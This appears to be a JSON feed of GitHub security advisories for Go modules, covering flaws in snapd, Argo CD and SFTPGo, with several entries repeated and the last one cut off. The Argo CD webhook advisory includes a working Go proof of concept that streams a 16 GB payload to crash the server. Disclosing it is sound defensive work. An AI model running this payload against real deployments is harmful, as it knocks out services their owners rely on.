{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Go modules",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/go.json",
    "description": "Security Advisory for Go modules on GitHub",
    "items": [
        {
            "content_html": "<p>In snapd versions prior to 2.62, when using AppArmor for enforcement of sandbox permissions, snapd failed to restrict writes to the $HOME/bin path. In Ubuntu, when this path exists, it is automatically added to the users PATH. An attacker who could convince a user to install a malicious snap which used the 'home' plug could use this vulnerability to install arbitrary scripts into the users PATH which may then be run by the user outside of the expected snap sandbox and hence allow them to escape confinement.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-1724\">https://nvd.nist.gov/vuln/detail/CVE-2024-1724</a></li>\n<li><a href=\"https://github.com/snapcore/snapd/pull/13689\">https://github.com/snapcore/snapd/pull/13689</a></li>\n<li><a href=\"https://github.com/snapcore/snapd/commit/aa191f97713de8dc3ce3ac818539f0b976eb8ef6\">https://github.com/snapcore/snapd/commit/aa191f97713de8dc3ce3ac818539f0b976eb8ef6</a></li>\n<li><a href=\"https://gld.mcphail.uk/posts/explaining-cve-2024-1724\">https://gld.mcphail.uk/posts/explaining-cve-2024-1724</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4mh8-9689-38vr\">https://github.com/advisories/GHSA-4mh8-9689-38vr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4mh8-9689-38vr",
            "title": "[github.com/snapcore/snapd] snapd failed to restrict writes to the $HOME/bin path",
            "date_modified": "2024-07-26T21:34:23.000Z",
            "date_published": "2024-07-25T21:31:20.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4mh8-9689-38vr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>In snapd versions prior to 2.62, snapd failed to properly check the file type when extracting a snap. The snap format is a squashfs file-system image and so can contain files that are non-regular files (such as pipes or sockets etc). Various file entries within the snap squashfs image (such as icons etc) are directly read by snapd when it is extracted. An attacker who could convince a user to install a malicious snap which contained non-regular files at these paths could then cause snapd to block indefinitely trying to read from such files and cause a denial of service.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-29068\">https://nvd.nist.gov/vuln/detail/CVE-2024-29068</a></li>\n<li><a href=\"https://github.com/snapcore/snapd/pull/13682\">https://github.com/snapcore/snapd/pull/13682</a></li>\n<li><a href=\"https://github.com/snapcore/snapd/commit/b66fee81606a1c05f965a876ccbaf44174194063\">https://github.com/snapcore/snapd/commit/b66fee81606a1c05f965a876ccbaf44174194063</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-64jh-cjwc-w8q6\">https://github.com/advisories/GHSA-64jh-cjwc-w8q6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-64jh-cjwc-w8q6",
            "title": "[github.com/snapcore/snapd] snapd failed to properly check the file type when extracting a snap",
            "date_modified": "2024-07-26T21:32:59.000Z",
            "date_published": "2024-07-25T21:31:20.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-64jh-cjwc-w8q6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>In snapd versions prior to 2.62, snapd failed to properly check the destination of symbolic links when extracting a snap. The snap format is a squashfs file-system image and so can contain symbolic links and other file types. Various file entries within the snap squashfs image (such as icons and desktop files etc) are directly read by snapd when it is extracted. An attacker who could convince a user to install a malicious snap which contained symbolic links at these paths could then cause snapd to write out the contents of the symbolic link destination into a world-readable directory. This in-turn could allow an unprivileged user to gain access to privileged information.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-29069\">https://nvd.nist.gov/vuln/detail/CVE-2024-29069</a></li>\n<li><a href=\"https://github.com/snapcore/snapd/pull/13682\">https://github.com/snapcore/snapd/pull/13682</a></li>\n<li><a href=\"https://github.com/snapcore/snapd/commit/b66fee81606a1c05f965a876ccbaf44174194063\">https://github.com/snapcore/snapd/commit/b66fee81606a1c05f965a876ccbaf44174194063</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-69p6-gp5x-j269\">https://github.com/advisories/GHSA-69p6-gp5x-j269</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-69p6-gp5x-j269",
            "title": "[github.com/snapcore/snapd] snapd failed to properly check the destination of symbolic links when extracting a snap",
            "date_modified": "2024-07-26T16:39:57.000Z",
            "date_published": "2024-07-25T21:31:20.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-69p6-gp5x-j269"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Argo CD v2.11.3 and before, discovering that even if the user's <code>p, role:myrole, exec, create, */*, allow</code> permissions are revoked, the user can still send any Websocket message, which allows the user to view sensitive information. Even though they shouldn't have such access.</p>\n<h2 id=\"description\">Description</h2>\n<p>Argo CD has a Web-based terminal that allows you to get a shell inside a running pod, just like you would with kubectl exec. However, when the administrator enables this function and grants permission to the user <code>p, role:myrole, exec, create, */*, allow</code>, even if the user revokes this permission, the user can still perform operations in the container, as long as the user keeps the terminal view open for a long time. CVE-2023-40025 Although the token expiration and revocation of the user are fixed, however, the fix does not address the situation of revocation of only user <code>p, role:myrole, exec, create, */*, allow</code> permissions, which may still lead to the leakage of sensitive information.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>A patch for this vulnerability has been released in the following Argo CD versions:</p>\n<p>v2.11.7\nv2.10.16\nv2.9.21</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<p>Open an issue in <a href=\"https://github.com/argoproj/argo-cd/issues\">the Argo CD issue tracker</a> or <a href=\"https://github.com/argoproj/argo-cd/discussions\">discussions</a>\nJoin us on <a href=\"https://argoproj.github.io/community/join-slack\">Slack</a> in channel #argo-cd</p>\n<h3 id=\"credits\">Credits</h3>\n<p>This vulnerability was found &amp; reported by \nShengjie Li, Huazhong University of Science and Technology\nZhi Li, Huazhong University of Science and Technology\nWeijie Liu, Nankai University</p>\n<p>The Argo team would like to thank these contributors for their responsible disclosure and constructive communications during the resolve of this issue</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/argoproj/argo-cd/security/advisories/GHSA-v8wx-v5jq-qhhw\">https://github.com/argoproj/argo-cd/security/advisories/GHSA-v8wx-v5jq-qhhw</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-41666\">https://nvd.nist.gov/vuln/detail/CVE-2024-41666</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/05edb2a9ca48f0f10608c1b49fbb0cf7164f6476\">https://github.com/argoproj/argo-cd/commit/05edb2a9ca48f0f10608c1b49fbb0cf7164f6476</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/e96f32d233504101ddac028a5bf8117433d333d6\">https://github.com/argoproj/argo-cd/commit/e96f32d233504101ddac028a5bf8117433d333d6</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/ef535230d8bd8ad7b18aab1ea1063e9751d348c4\">https://github.com/argoproj/argo-cd/commit/ef535230d8bd8ad7b18aab1ea1063e9751d348c4</a></li>\n<li><a href=\"https://drive.google.com/file/d/1Fynj5Sho8Lf8CETqsNXZyPKlTDdmgJuN/view?usp=sharing\">https://drive.google.com/file/d/1Fynj5Sho8Lf8CETqsNXZyPKlTDdmgJuN/view?usp=sharing</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-v8wx-v5jq-qhhw\">https://github.com/advisories/GHSA-v8wx-v5jq-qhhw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-v8wx-v5jq-qhhw",
            "title": "[github.com/argoproj/argo-cd] The Argo CD web terminal session does not handle the revocation of user permissions properly",
            "date_modified": "2024-07-24T20:54:03.000Z",
            "date_published": "2024-07-24T20:54:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-v8wx-v5jq-qhhw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Argo CD v2.11.3 and before, discovering that even if the user's <code>p, role:myrole, exec, create, */*, allow</code> permissions are revoked, the user can still send any Websocket message, which allows the user to view sensitive information. Even though they shouldn't have such access.</p>\n<h2 id=\"description\">Description</h2>\n<p>Argo CD has a Web-based terminal that allows you to get a shell inside a running pod, just like you would with kubectl exec. However, when the administrator enables this function and grants permission to the user <code>p, role:myrole, exec, create, */*, allow</code>, even if the user revokes this permission, the user can still perform operations in the container, as long as the user keeps the terminal view open for a long time. CVE-2023-40025 Although the token expiration and revocation of the user are fixed, however, the fix does not address the situation of revocation of only user <code>p, role:myrole, exec, create, */*, allow</code> permissions, which may still lead to the leakage of sensitive information.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>A patch for this vulnerability has been released in the following Argo CD versions:</p>\n<p>v2.11.7\nv2.10.16\nv2.9.21</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<p>Open an issue in <a href=\"https://github.com/argoproj/argo-cd/issues\">the Argo CD issue tracker</a> or <a href=\"https://github.com/argoproj/argo-cd/discussions\">discussions</a>\nJoin us on <a href=\"https://argoproj.github.io/community/join-slack\">Slack</a> in channel #argo-cd</p>\n<h3 id=\"credits\">Credits</h3>\n<p>This vulnerability was found &amp; reported by \nShengjie Li, Huazhong University of Science and Technology\nZhi Li, Huazhong University of Science and Technology\nWeijie Liu, Nankai University</p>\n<p>The Argo team would like to thank these contributors for their responsible disclosure and constructive communications during the resolve of this issue</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/argoproj/argo-cd/security/advisories/GHSA-v8wx-v5jq-qhhw\">https://github.com/argoproj/argo-cd/security/advisories/GHSA-v8wx-v5jq-qhhw</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-41666\">https://nvd.nist.gov/vuln/detail/CVE-2024-41666</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/05edb2a9ca48f0f10608c1b49fbb0cf7164f6476\">https://github.com/argoproj/argo-cd/commit/05edb2a9ca48f0f10608c1b49fbb0cf7164f6476</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/e96f32d233504101ddac028a5bf8117433d333d6\">https://github.com/argoproj/argo-cd/commit/e96f32d233504101ddac028a5bf8117433d333d6</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/ef535230d8bd8ad7b18aab1ea1063e9751d348c4\">https://github.com/argoproj/argo-cd/commit/ef535230d8bd8ad7b18aab1ea1063e9751d348c4</a></li>\n<li><a href=\"https://drive.google.com/file/d/1Fynj5Sho8Lf8CETqsNXZyPKlTDdmgJuN/view?usp=sharing\">https://drive.google.com/file/d/1Fynj5Sho8Lf8CETqsNXZyPKlTDdmgJuN/view?usp=sharing</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-v8wx-v5jq-qhhw\">https://github.com/advisories/GHSA-v8wx-v5jq-qhhw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-v8wx-v5jq-qhhw",
            "title": "[github.com/argoproj/argo-cd] The Argo CD web terminal session does not handle the revocation of user permissions properly",
            "date_modified": "2024-07-24T20:54:03.000Z",
            "date_published": "2024-07-24T20:54:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-v8wx-v5jq-qhhw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Argo CD v2.11.3 and before, discovering that even if the user's <code>p, role:myrole, exec, create, */*, allow</code> permissions are revoked, the user can still send any Websocket message, which allows the user to view sensitive information. Even though they shouldn't have such access.</p>\n<h2 id=\"description\">Description</h2>\n<p>Argo CD has a Web-based terminal that allows you to get a shell inside a running pod, just like you would with kubectl exec. However, when the administrator enables this function and grants permission to the user <code>p, role:myrole, exec, create, */*, allow</code>, even if the user revokes this permission, the user can still perform operations in the container, as long as the user keeps the terminal view open for a long time. CVE-2023-40025 Although the token expiration and revocation of the user are fixed, however, the fix does not address the situation of revocation of only user <code>p, role:myrole, exec, create, */*, allow</code> permissions, which may still lead to the leakage of sensitive information.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>A patch for this vulnerability has been released in the following Argo CD versions:</p>\n<p>v2.11.7\nv2.10.16\nv2.9.21</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<p>Open an issue in <a href=\"https://github.com/argoproj/argo-cd/issues\">the Argo CD issue tracker</a> or <a href=\"https://github.com/argoproj/argo-cd/discussions\">discussions</a>\nJoin us on <a href=\"https://argoproj.github.io/community/join-slack\">Slack</a> in channel #argo-cd</p>\n<h3 id=\"credits\">Credits</h3>\n<p>This vulnerability was found &amp; reported by \nShengjie Li, Huazhong University of Science and Technology\nZhi Li, Huazhong University of Science and Technology\nWeijie Liu, Nankai University</p>\n<p>The Argo team would like to thank these contributors for their responsible disclosure and constructive communications during the resolve of this issue</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/argoproj/argo-cd/security/advisories/GHSA-v8wx-v5jq-qhhw\">https://github.com/argoproj/argo-cd/security/advisories/GHSA-v8wx-v5jq-qhhw</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-41666\">https://nvd.nist.gov/vuln/detail/CVE-2024-41666</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/05edb2a9ca48f0f10608c1b49fbb0cf7164f6476\">https://github.com/argoproj/argo-cd/commit/05edb2a9ca48f0f10608c1b49fbb0cf7164f6476</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/e96f32d233504101ddac028a5bf8117433d333d6\">https://github.com/argoproj/argo-cd/commit/e96f32d233504101ddac028a5bf8117433d333d6</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/ef535230d8bd8ad7b18aab1ea1063e9751d348c4\">https://github.com/argoproj/argo-cd/commit/ef535230d8bd8ad7b18aab1ea1063e9751d348c4</a></li>\n<li><a href=\"https://drive.google.com/file/d/1Fynj5Sho8Lf8CETqsNXZyPKlTDdmgJuN/view?usp=sharing\">https://drive.google.com/file/d/1Fynj5Sho8Lf8CETqsNXZyPKlTDdmgJuN/view?usp=sharing</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-v8wx-v5jq-qhhw\">https://github.com/advisories/GHSA-v8wx-v5jq-qhhw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-v8wx-v5jq-qhhw",
            "title": "[github.com/argoproj/argo-cd] The Argo CD web terminal session does not handle the revocation of user permissions properly",
            "date_modified": "2024-07-24T20:54:03.000Z",
            "date_published": "2024-07-24T20:54:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-v8wx-v5jq-qhhw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>In SFTPGo 2.6.2, the JWT implementation lacks certain security measures, such as using JWT ID (JTI) claims, nonces, and proper expiration and invalidation mechanisms.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-40430\">https://nvd.nist.gov/vuln/detail/CVE-2024-40430</a></li>\n<li><a href=\"https://alexsecurity.rocks/posts/cve-2024-40430\">https://alexsecurity.rocks/posts/cve-2024-40430</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x72p-g37q-4xr9\">https://github.com/advisories/GHSA-x72p-g37q-4xr9</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x72p-g37q-4xr9",
            "title": "[github.com/drakkan/sftpgo/v2] SFTPGo's JWT implmentation lacks certain security measures",
            "date_modified": "2024-07-26T21:37:18.000Z",
            "date_published": "2024-07-22T09:31:55.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x72p-g37q-4xr9"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>This report details a security vulnerability in Argo CD, where an unauthenticated attacker can send a specially crafted large JSON payload to the /api/webhook endpoint, causing excessive memory allocation that leads to service disruption by triggering an Out Of Memory (OOM) kill. The issue poses a high risk to the availability of Argo CD deployments.</p>\n<h3 id=\"details\">Details</h3>\n<p>The webhook server always listens to requests. By default, the endpoint doesn't require authentication. It's possible to send a large, malicious request with headers (in this case \"X-GitHub-Event: push\") that will make ArgoCD start allocating memory to parse the incoming request. Since the request can be constructed client-side without allocating large amounts of memory, it can be arbitrarily large. Eventually, the argocd-server component will get OOMKilled as it consumes all its available memory.</p>\n<p>The fix would be to enforce a limit on the size of the request being parsed.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Port-forward to the argocd-server service, like so:</p>\n<pre><code class=\"language-console\">kubectl port-forward svc/argocd-server -n argocd 8080:443\n</code></pre>\n<p>Run the below code:</p>\n<pre><code class=\"language-go\">package main\n\nimport (\n    \"crypto/tls\"\n    \"io\"\n    \"net/http\"\n)\n\n// Define a custom io.Reader that generates a large dummy JSON payload.\ntype DummyJSONReader struct {\n    size int64 // Total size to generate\n    read int64 // Bytes already generated\n}\n\n// Read generates the next chunk of the dummy JSON payload.\nfunc (r *DummyJSONReader) Read(p []byte) (n int, err error) {\n    if r.read &gt;= r.size {\n        return 0, io.EOF // Finished generating\n    }\n\n    start := false\n    if r.read == 0 {\n        // Start of JSON\n        p[0] = '{'\n        p[1] = '\"'\n        p[2] = 'd'\n        p[3] = 'a'\n        p[4] = 't'\n        p[5] = 'a'\n        p[6] = '\"'\n        p[7] = ':'\n        p[8] = '\"'\n        n = 9\n        start = true\n    }\n\n    for i := n; i &lt; len(p); i++ {\n        if r.read+int64(i)-int64(n)+1 == r.size-1 {\n            // End of JSON\n            p[i] = '\"'\n            p[i+1] = '}'\n            r.read += int64(i) + 2 - int64(n)\n            return i + 2 - n, nil\n        } else {\n            p[i] = 'x' // Dummy data\n        }\n    }\n\n    r.read += int64(len(p)) - int64(n)\n    if start {\n        return len(p), nil\n    }\n    return len(p) - n, nil\n}\n\nfunc main() {\n    // Initialize the custom reader with the desired size (16GB in this case).\n    payloadSize := int64(16) * 1024 * 1024 * 1024 // 16GB\n    reader := &amp;DummyJSONReader{size: payloadSize}\n\n    // HTTP client setup\n    httpClient := &amp;http.Client{\n        Timeout: 0, // No timeout\n        Transport: &amp;http.Transport{\n            TLSClientConfig: &amp;tls.Config{InsecureSkipVerify: true},\n        },\n    }\n\n    req, err := http.NewRequest(\"POST\", \"https://localhost:8080/api/webhook\", reader)\n    if err != nil {\n        panic(err)\n    }\n\n    // Set headers\n    req.Header.Set(\"Content-Type\", \"application/json\")\n    req.Header.Set(\"X-GitHub-Event\", \"push\")\n\n    resp, err := httpClient.Do(req)\n    if err != nil {\n        panic(err)\n    }\n    defer resp.Body.Close()\n\n    println(\"Response status code:\", resp.StatusCode)\n}\n</code></pre>\n<h3 id=\"patches\">Patches</h3>\n<p>A patch for this vulnerability has been released in the following Argo CD versions:</p>\n<p>v2.11.6\nv2.10.15\nv2.9.20</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<p>Open an issue in <a href=\"https://github.com/argoproj/argo-cd/issues\">the Argo CD issue tracker</a> or <a href=\"https://github.com/argoproj/argo-cd/discussions\">discussions</a>\nJoin us on <a href=\"https://argoproj.github.io/community/join-slack\">Slack</a> in channel #argo-cd</p>\n<h3 id=\"credits\">Credits</h3>\n<p>This vulnerability was found &amp; reported by Jakub Ciolek</p>\n<p>The Argo team would like to thank these contributors for their responsible disclosure and constructive communications during the resolve of this issue</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/argoproj/argo-cd/security/advisories/GHSA-jmvp-698c-4x3w\">https://github.com/argoproj/argo-cd/security/advisories/GHSA-jmvp-698c-4x3w</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/46c0c0b64deaab1ece70cb701030b76668ad0cdc\">https://github.com/argoproj/argo-cd/commit/46c0c0b64deaab1ece70cb701030b76668ad0cdc</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/540e3a57b90eb3655db54793332fac86bcc38b36\">https://github.com/argoproj/argo-cd/commit/540e3a57b90eb3655db54793332fac86bcc38b36</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/d881ee78949e23160a0b280bb159e4d3d625a4df\">https://github.com/argoproj/argo-cd/commit/d881ee78949e23160a0b280bb159e4d3d625a4df</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-40634\">https://nvd.nist.gov/vuln/detail/CVE-2024-40634</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jmvp-698c-4x3w\">https://github.com/advisories/GHSA-jmvp-698c-4x3w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jmvp-698c-4x3w",
            "title": "[github.com/argoproj/argo-cd/v2] Argo CD Unauthenticated Denial of Service (DoS) Vulnerability via /api/webhook Endpoint",
            "date_modified": "2024-07-22T19:58:30.000Z",
            "date_published": "2024-07-22T17:20:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jmvp-698c-4x3w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>This report details a security vulnerability in Argo CD, where an unauthenticated attacker can send a specially crafted large JSON payload to the /api/webhook endpoint, causing excessive memory allocation that leads to service disruption by triggering an Out Of Memory (OOM) kill. The issue poses a high risk to the availability of Argo CD deployments.</p>\n<h3 id=\"details\">Details</h3>\n<p>The webhook server always listens to requests. By default, the endpoint doesn't require authentication. It's possible to send a large, malicious request with headers (in this case \"X-GitHub-Event: push\") that will make ArgoCD start allocating memory to parse the incoming request. Since the request can be constructed client-side without allocating large amounts of memory, it can be arbitrarily large. Eventually, the argocd-server component will get OOMKilled as it consumes all its available memory.</p>\n<p>The fix would be to enforce a limit on the size of the request being parsed.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Port-forward to the argocd-server service, like so:</p>\n<pre><code class=\"language-console\">kubectl port-forward svc/argocd-server -n argocd 8080:443\n</code></pre>\n<p>Run the below code:</p>\n<pre><code class=\"language-go\">package main\n\nimport (\n    \"crypto/tls\"\n    \"io\"\n    \"net/http\"\n)\n\n// Define a custom io.Reader that generates a large dummy JSON payload.\ntype DummyJSONReader struct {\n    size int64 // Total size to generate\n    read int64 // Bytes already generated\n}\n\n// Read generates the next chunk of the dummy JSON payload.\nfunc (r *DummyJSONReader) Read(p []byte) (n int, err error) {\n    if r.read &gt;= r.size {\n        return 0, io.EOF // Finished generating\n    }\n\n    start := false\n    if r.read == 0 {\n        // Start of JSON\n        p[0] = '{'\n        p[1] = '\"'\n        p[2] = 'd'\n        p[3] = 'a'\n        p[4] = 't'\n        p[5] = 'a'\n        p[6] = '\"'\n        p[7] = ':'\n        p[8] = '\"'\n        n = 9\n        start = true\n    }\n\n    for i := n; i &lt; len(p); i++ {\n        if r.read+int64(i)-int64(n)+1 == r.size-1 {\n            // End of JSON\n            p[i] = '\"'\n            p[i+1] = '}'\n            r.read += int64(i) + 2 - int64(n)\n            return i + 2 - n, nil\n        } else {\n            p[i] = 'x' // Dummy data\n        }\n    }\n\n    r.read += int64(len(p)) - int64(n)\n    if start {\n        return len(p), nil\n    }\n    return len(p) - n, nil\n}\n\nfunc main() {\n    // Initialize the custom reader with the desired size (16GB in this case).\n    payloadSize := int64(16) * 1024 * 1024 * 1024 // 16GB\n    reader := &amp;DummyJSONReader{size: payloadSize}\n\n    // HTTP client setup\n    httpClient := &amp;http.Client{\n        Timeout: 0, // No timeout\n        Transport: &amp;http.Transport{\n            TLSClientConfig: &amp;tls.Config{InsecureSkipVerify: true},\n        },\n    }\n\n    req, err := http.NewRequest(\"POST\", \"https://localhost:8080/api/webhook\", reader)\n    if err != nil {\n        panic(err)\n    }\n\n    // Set headers\n    req.Header.Set(\"Content-Type\", \"application/json\")\n    req.Header.Set(\"X-GitHub-Event\", \"push\")\n\n    resp, err := httpClient.Do(req)\n    if err != nil {\n        panic(err)\n    }\n    defer resp.Body.Close()\n\n    println(\"Response status code:\", resp.StatusCode)\n}\n</code></pre>\n<h3 id=\"patches\">Patches</h3>\n<p>A patch for this vulnerability has been released in the following Argo CD versions:</p>\n<p>v2.11.6\nv2.10.15\nv2.9.20</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<p>Open an issue in <a href=\"https://github.com/argoproj/argo-cd/issues\">the Argo CD issue tracker</a> or <a href=\"https://github.com/argoproj/argo-cd/discussions\">discussions</a>\nJoin us on <a href=\"https://argoproj.github.io/community/join-slack\">Slack</a> in channel #argo-cd</p>\n<h3 id=\"credits\">Credits</h3>\n<p>This vulnerability was found &amp; reported by Jakub Ciolek</p>\n<p>The Argo team would like to thank these contributors for their responsible disclosure and constructive communications during the resolve of this issue</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/argoproj/argo-cd/security/advisories/GHSA-jmvp-698c-4x3w\">https://github.com/argoproj/argo-cd/security/advisories/GHSA-jmvp-698c-4x3w</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/46c0c0b64deaab1ece70cb701030b76668ad0cdc\">https://github.com/argoproj/argo-cd/commit/46c0c0b64deaab1ece70cb701030b76668ad0cdc</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/540e3a57b90eb3655db54793332fac86bcc38b36\">https://github.com/argoproj/argo-cd/commit/540e3a57b90eb3655db54793332fac86bcc38b36</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/d881ee78949e23160a0b280bb159e4d3d625a4df\">https://github.com/argoproj/argo-cd/commit/d881ee78949e23160a0b280bb159e4d3d625a4df</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-40634\">https://nvd.nist.gov/vuln/detail/CVE-2024-40634</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jmvp-698c-4x3w\">https://github.com/advisories/GHSA-jmvp-698c-4x3w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jmvp-698c-4x3w",
            "title": "[github.com/argoproj/argo-cd/v2] Argo CD Unauthenticated Denial of Service (DoS) Vulnerability via /api/webhook Endpoint",
            "date_modified": "2024-07-22T19:58:30.000Z",
            "date_published": "2024-07-22T17:20:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jmvp-698c-4x3w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>This report details a security vulnerability in Argo CD, where an unauthenticated attacker can send a specially crafted large JSON payload to the /api/webhook endpoint, causing excessive memory allocation that leads to service disruption by triggering an Out Of Memory (OOM) kill. The issue poses a high risk to the availability of Argo CD deployments.</p>\n<h3 id=\"details\">Details</h3>\n<p>The webhook server always listens to requests. By default, the endpoint doesn't require authentication. It's possible to send a large, malicious request with headers (in this case \"X-GitHub-Event: push\") that will make ArgoCD start allocating memory to parse the incoming request. Since the request can be constructed client-side without allocating large amounts of memory, it can be arbitrarily large. Eventually, the argocd-server component will get OOMKilled as it consumes all its available memory.</p>\n<p>The fix would be to enforce a limit on the size of the request being parsed.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Port-forward to the argocd-server service, like so:</p>\n<pre><code class=\"language-console\">kubectl port-forward svc/argocd-server -n argocd 8080:443\n</code></pre>\n<p>Run the below code:</p>\n<pre><code class=\"language-go\">package main\n\nimport (\n    \"crypto/tls\"\n    \"io\"\n    \"net/http\"\n)\n\n// Define a custom io.Reader that generates a large dummy JSON payload.\ntype DummyJSONReader struct {\n    size int64 // Total size to generate\n    read int64 // Bytes already generated\n}\n\n// Read generates the next chunk of the dummy JSON payload.\nfunc (r *DummyJSONReader) Read(p []byte) (n int, err error) {\n    if r.read &gt;= r.size {\n        return 0, io.EOF // Finished generating\n    }\n\n    start := false\n    if r.read == 0 {\n        // Start of JSON\n        p[0] = '{'\n        p[1] = '\"'\n        p[2] = 'd'\n        p[3] = 'a'\n        p[4] = 't'\n        p[5] = 'a'\n        p[6] = '\"'\n        p[7] = ':'\n        p[8] = '\"'\n        n = 9\n        start = true\n    }\n\n    for i := n; i &lt; len(p); i++ {\n        if r.read+int64(i)-int64(n)+1 == r.size-1 {\n            // End of JSON\n            p[i] = '\"'\n            p[i+1] = '}'\n            r.read += int64(i) + 2 - int64(n)\n            return i + 2 - n, nil\n        } else {\n            p[i] = 'x' // Dummy data\n        }\n    }\n\n    r.read += int64(len(p)) - int64(n)\n    if start {\n        return len(p), nil\n    }\n    return len(p) - n, nil\n}\n\nfunc main() {\n    // Initialize the custom reader with the desired size (16GB in this case).\n    payloadSize := int64(16) * 1024 * 1024 * 1024 // 16GB\n    reader := &amp;DummyJSONReader{size: payloadSize}\n\n    // HTTP client setup\n    httpClient := &amp;http.Client{\n        Timeout: 0, // No timeout\n        Transport: &amp;http.Transport{\n            TLSClientConfig: &amp;tls.Config{InsecureSkipVerify: true},\n        },\n    }\n\n    req, err := http.NewRequest(\"POST\", \"https://localhost:8080/api/webhook\", reader)\n    if err != nil {\n        panic(err)\n    }\n\n    // Set headers\n    req.Header.Set(\"Content-Type\", \"application/json\")\n    req.Header.Set(\"X-GitHub-Event\", \"push\")\n\n    resp, err := httpClient.Do(req)\n    if err != nil {\n        panic(err)\n    }\n    defer resp.Body.Close()\n\n    println(\"Response status code:\", resp.StatusCode)\n}\n</code></pre>\n<h3 